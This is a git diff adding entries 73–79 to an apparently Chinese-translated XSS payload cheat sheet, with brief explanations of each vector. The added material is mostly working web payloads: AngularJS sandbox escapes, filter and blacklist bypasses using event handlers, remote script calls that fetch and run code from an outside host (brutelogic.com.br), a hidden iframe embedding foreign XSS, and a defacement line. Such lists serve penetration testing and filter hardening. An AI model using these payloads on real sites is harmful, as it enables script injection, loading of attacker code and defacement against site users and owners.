@@ -516,7 +516,73 @@ javascript&#9:1
 "javas%0Dcript:1"
 %00javascript:1
 ```
-**73.**
+**73.AngularJS Injection (v1.6+) – No Parentheses, Brackets or Quotes (AngularJS注入-无括号、括号或引号)** <br>
+以下payload用于避免xss过滤。第一,二个payload为了避免括号,最后一个payload,通过在URL中通正确编码,在相同或分离的注入点中使用它来避免引号。 <br>
+```
+{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+&#123&#123$new.constructor('alert(1)')()&#125&#125
+<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}
+```
+**74.Inside Comments Bypass (内部评论绕过)** <br>
+如果HTML注释中允许任何内容，则使用payload`（regex:/<！--.*-->/)`. <br>
+```
+<!--><svg onload=alert(1)-->
+```
+**75.Agnostic Event Handlers Vectors – Native Script Based (未知事件处理程序向量-基于本机脚本)** <br>
+以下带有事件处理程序的payload，可以与任意标记名一起使用，这有助于绕过黑名单检测。它们需要在注入之后在页面中加载一些脚本。请记住，在下面的处理程序中使用诸如`"<b"`之类的现有标记名,可能是在某些情况下触发xss的唯一方法。
+```
+<x onafterscriptexecute=alert(1)>
+<x onbeforescriptexecute=alert(1)>
+```
+**76.Agnostic Event Handlers Vectors – CSS3 Based (未知事件处理程序向量——基于CSS3)** <br>
+以下带有带有事件处理程序的向量，可以与任意标记名一起使用，这有助于绕过黑名单。它们需要`<style>`标签,或使用`<link`>标签导入样式表。最后
+四个payload只适用于火狐。
+```
+<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+```
+**77.Remote Script Call (远程脚本调用)** <br>
+以下payload用于当需要调用外部脚本,但XSS向量是基于web应用处理程序的脚本时使用(如`<svg onload=`)或通过javascript注入 <br>
+"brutelogic.com.br"域和HTML,js文件为例。如果以某种方式过滤`">"`，请将`"r=>"`或`"w=>"`替换为 `"function()"`。<br>
+
+```
+=> HTML-based
+(response must be HTML with an Access-Control-Allow-Origin (CORS) header)
+"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
+x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
+fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})
+
+(with fully loaded JQuery library)
+$.get('//brutelogic.com.br/0.php',r=>{write(r)})
+
+=> Javascript-based
+(response must be javascript)
+with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
+
+(with fully loaded JQuery library)
+$.getScript('//brutelogic.com.br/2.js')
+(CORS and js extension required)
+import('//domain/file')
+```
+
+**78.Invisible Foreign XSS Embedding (不可见的外部XSS嵌入)** <br>
+以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的X-Frame-Options（XFO）头文件。<br>
+下面是brutelogic.com.br上下文中的弹窗示例,不分域名。<br>
+```
+<iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>"
+style=display:none></iframe>
+```
+**79.Simple Virtual Defacement (简单的虚假网页信息)** <br>
+以下payload用于更改网站HTML代码的显示方式。在下面的例子中显示"Not Found"消息。<br>
+```
+documentElement.innerHTML='<h1>Not Found</h1>'
+```
 
 ## 致谢
 **英文议题作者：** <br>
@@ -524,7 +590,7 @@ javascript&#9:1
 <br>
 **中文翻译团队：**<br>
 @farmsec <br>
+@farmsec_answer <br>
 @farmsec_alice <br>
 @farmsec_lancet <br>
-@farmsec_answer <br>
 
